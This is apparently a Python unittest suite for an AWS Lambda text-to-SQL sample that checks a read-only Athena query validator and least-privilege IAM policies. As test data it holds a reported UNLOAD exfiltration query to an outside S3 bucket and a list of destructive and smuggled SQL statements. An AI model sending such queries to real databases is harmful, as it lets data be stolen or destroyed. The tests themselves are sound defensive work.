import json
import os
import pathlib
import sys
import types
import unittest
from unittest import mock

SAMPLE_ROOT = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(SAMPLE_ROOT))
sys.path.insert(0, str(SAMPLE_ROOT / "dependencies"))

try:
    import boto3  # noqa: F401
except ModuleNotFoundError:
    sys.modules["boto3"] = types.SimpleNamespace(
        client=lambda service_name: (_ for _ in ()).throw(
            AssertionError(f"unexpected {service_name} client creation")
        )
    )

from lambda_function import execute_athena_query, lambda_handler
from query_guard import MAX_QUERY_LENGTH, QueryValidationError, validate_read_only_query
from security_config import (
    build_athena_workgroup_configuration,
    build_glue_data_policy,
    build_lambda_query_policy,
)




REPORTED_EXPLOIT = (
    "UNLOAD (SELECT 'vuln-poc-exfil-marker' AS marker) "
    "TO 's3://unrelated-bucket/exfil/' WITH (format='TEXTFILE')"
)


def query_event(query):
    return {
        "actionGroup": "QueryAthenaActionGroup",
        "apiPath": "/querydatabase",
        "httpMethod": "POST",
        "requestBody": {
            "content": {
                "application/json": {
                    "properties": [
                        {"name": "query", "type": "string", "value": query}
                    ]
                }
            }
        },
        "sessionAttributes": {},
        "promptSessionAttributes": {},
    }


class SuccessfulAthenaClient:
    def __init__(self):
        self.start_request = None

    def start_query_execution(self, **kwargs):
        self.start_request = kwargs
        return {"QueryExecutionId": "test-query-id"}

    def get_query_execution(self, **kwargs):
        return {"QueryExecution": {"Status": {"State": "SUCCEEDED"}}}

    def get_query_results(self, **kwargs):
        return {
            "ResultSet": {
                "ResultSetMetadata": {"ColumnInfo": []},
                "Rows": [],
            }
        }


class QueryGuardTests(unittest.TestCase):
    def test_accepts_supported_read_only_queries(self):
        safe_queries = [
            "SELECT * FROM players LIMIT 10",
            "SELECT name, year FROM thehistoryofbaseball.players WHERE year > 2000;",
            "SELECT COUNT(*) AS player_count FROM players",
            "SELECT p.name FROM players p JOIN teams t ON p.team_id = t.id",
            "SELECT * FROM (SELECT name FROM players LIMIT 5) recent_players",
            "SELECT 'UNLOAD; DROP TABLE players' AS harmless_string",
            "SELECT name FROM players UNION ALL SELECT name FROM managers",
        ]

        for query in safe_queries:
            with self.subTest(query=query):
                self.assertFalse(validate_read_only_query(query).endswith(";"))

    def test_reported_unload_exploit(self):
        with self.assertRaises(QueryValidationError):
            validate_read_only_query(REPORTED_EXPLOIT)

    def test_reported_exploit_never_reaches_athena_client(self):
        class RejectIfCalledClient:
            def __init__(self):
                self.called = False

            def start_query_execution(self, **kwargs):
                self.called = True
                raise AssertionError("unsafe SQL reached Athena")

        client = RejectIfCalledClient()

        with self.assertRaises(QueryValidationError):
            execute_athena_query(REPORTED_EXPLOIT, athena_client=client)
        self.assertFalse(client.called)

    def test_handler_returns_400_for_reported_exploit(self):
        response = lambda_handler(query_event(REPORTED_EXPLOIT), None)

        self.assertEqual(response["response"]["httpStatusCode"], 400)
        body = json.loads(
            response["response"]["responseBody"]["application/json"]["body"]
        )
        self.assertEqual(
            body, {"error": "Only read-only SELECT statements are allowed."}
        )

    def test_safe_query_uses_only_dedicated_workgroup(self):
        client = SuccessfulAthenaClient()
        with mock.patch.dict(
            os.environ,
            {"ATHENA_WORKGROUP": "text-to-sql-workgroup"},
            clear=False,
        ):
            result = execute_athena_query(
                "SELECT name FROM players LIMIT 10", athena_client=client
            )

        self.assertEqual(result, {"rows": [], "truncated": False})
        self.assertEqual(
            client.start_request,
            {
                "QueryString": "SELECT name FROM players LIMIT 10",
                "QueryExecutionContext": {
                    "Catalog": "AwsDataCatalog",
                    "Database": "thehistoryofbaseball",
                },
                "WorkGroup": "text-to-sql-workgroup",
            },
        )

    def test_validator_mutation_exposes_reported_exploit(self):
        """Prove replacing the validator with identity reopens the API boundary."""
        client = SuccessfulAthenaClient()
        with mock.patch(
            "lambda_function.validate_read_only_query", side_effect=lambda query: query
        ), mock.patch.dict(
            os.environ,
            {"ATHENA_WORKGROUP": "text-to-sql-workgroup"},
            clear=False,
        ):
            execute_athena_query(REPORTED_EXPLOIT, athena_client=client)

        self.assertEqual(client.start_request["QueryString"], REPORTED_EXPLOIT)

    def test_rejects_mutating_and_administrative_statements(self):
        unsafe_queries = [
            "INSERT INTO players SELECT * FROM other_players",
            "UPDATE players SET name = 'changed'",
            "DELETE FROM players",
            "MERGE INTO players USING updates ON players.id = updates.id WHEN MATCHED THEN DELETE",
            "CREATE TABLE copied AS SELECT * FROM players",
            "DROP TABLE players",
            "ALTER TABLE players RENAME TO stolen",
            "TRUNCATE TABLE players",
            "CALL system.runtime.kill_query('query-id', 'reason')",
            "GRANT SELECT ON players TO attacker",
            "SHOW TABLES",
            "DESCRIBE players",
        ]

        for query in unsafe_queries:
            with self.subTest(query=query), self.assertRaises(QueryValidationError):
                validate_read_only_query(query)

    def test_rejects_common_obfuscation_and_statement_smuggling(self):
        unsafe_queries = [
            "SELECT * FROM players; UNLOAD (SELECT * FROM players) TO 's3://other/'",
            "SELECT * FROM players; DROP TABLE players;",
            "SELECT * FROM players -- hide the next token",
            "SELECT * FROM players /* comment */",
            "SELECT * FROM players UNION ALL DELETE FROM players",
            "WITH stolen AS (DELETE FROM players RETURNING *) SELECT * FROM stolen",
            'SELECT * FROM "players"',
            "SELECT * FROM `players`",
            "SELECT * FROM information_schema.tables",
            "SELECT * FROM system.runtime.queries",
            "SELECT * FROM players WHERE name = 'unterminated",
            "SELECT * FROM players)",
            "SELECT * FROM players\\n",
            "SELECT * FROM players； DROP TABLE players",
            "SELECT U1NLOAD",
            "SELECT _UNLOAD",
            "SELECT 0x55NLOAD",
            "SELECT 1DROP",
            "SELECT * FROM TABLE(connector_query('SELECT 1'))",
            "SELECT * FROM UNNEST(ARRAY[1, 2])",
            "SELECT * FROM catalog.system.query('SELECT 1')",
        ]

        for query in unsafe_queries:
            with self.subTest(query=query), self.assertRaises(QueryValidationError):
                validate_read_only_query(query)

    def test_rejects_invalid_size_and_type(self):
        invalid_queries = [None, 123, "", " ", "SELECT " + "x" * MAX_QUERY_LENGTH]

        for query in invalid_queries:
            with self.subTest(query=query), self.assertRaises(QueryValidationError):
                validate_read_only_query(query)


class LeastPrivilegePolicyTests(unittest.TestCase):
    def setUp(self):
        self.policy = build_lambda_query_policy(
            region="us-east-1",
            account_id="111122223333",
            bucket_name="text-to-sql-sample",
            database_name="thehistoryofbaseball",
            workgroup_name="text-to-sql-workgroup",
        )

    def test_lambda_policy_has_no_global_resource_or_wildcard_action(self):
        for statement in self.policy["Statement"]:
            resources = statement["Resource"]
            if isinstance(resources, str):
                resources = [resources]
            actions = statement["Action"]
            if isinstance(actions, str):
                actions = [actions]

            self.assertNotIn("*", resources)
            self.assertTrue(all("*" not in action for action in actions))

    def test_lambda_policy_is_scoped_to_sample_storage_and_workgroup(self):
        rendered = str(self.policy)

        self.assertIn(
            "arn:aws:athena:us-east-1:111122223333:workgroup/text-to-sql-workgroup",
            rendered,
        )
        self.assertIn("arn:aws:s3:::text-to-sql-sample/data/*", rendered)
        self.assertIn("arn:aws:s3:::text-to-sql-sample/athena_result/*", rendered)
        self.assertNotIn("arn:aws:s3:::*", rendered)
        self.assertNotIn("s3:*", rendered)
        self.assertNotIn("glue:*", rendered)
        self.assertNotIn("athena:*", rendered)

    def test_lambda_policy_cannot_mutate_glue_catalog(self):
        actions = {
            action
            for statement in self.policy["Statement"]
            for action in (
                statement["Action"]
                if isinstance(statement["Action"], list)
                else [statement["Action"]]
            )
        }

        self.assertNotIn("glue:CreateTable", actions)
        self.assertNotIn("glue:UpdateTable", actions)
        self.assertNotIn("glue:DeleteTable", actions)

    def test_workgroup_enforces_output_encryption_and_scan_limit(self):
        configuration = build_athena_workgroup_configuration(
            account_id="111122223333",
            output_location="s3://text-to-sql-sample/athena_result/",
            bytes_scanned_cutoff=100_000_000,
        )

        self.assertTrue(configuration["EnforceWorkGroupConfiguration"])
        self.assertFalse(configuration["RequesterPaysEnabled"])
        self.assertEqual(
            configuration["BytesScannedCutoffPerQuery"], 100_000_000
        )
        self.assertEqual(
            configuration["ResultConfiguration"],
            {
                "OutputLocation": "s3://text-to-sql-sample/athena_result/",
                "EncryptionConfiguration": {"EncryptionOption": "SSE_S3"},
                "ExpectedBucketOwner": "111122223333",
            },
        )

    def test_glue_policy_reads_only_sample_data_prefix(self):
        policy = build_glue_data_policy("text-to-sql-sample")
        rendered = str(policy)

        self.assertIn("arn:aws:s3:::text-to-sql-sample/data/*", rendered)
        self.assertNotIn("arn:aws:s3:::*", rendered)
        self.assertNotIn("s3:*", rendered)


if __name__ == "__main__":
    unittest.main()
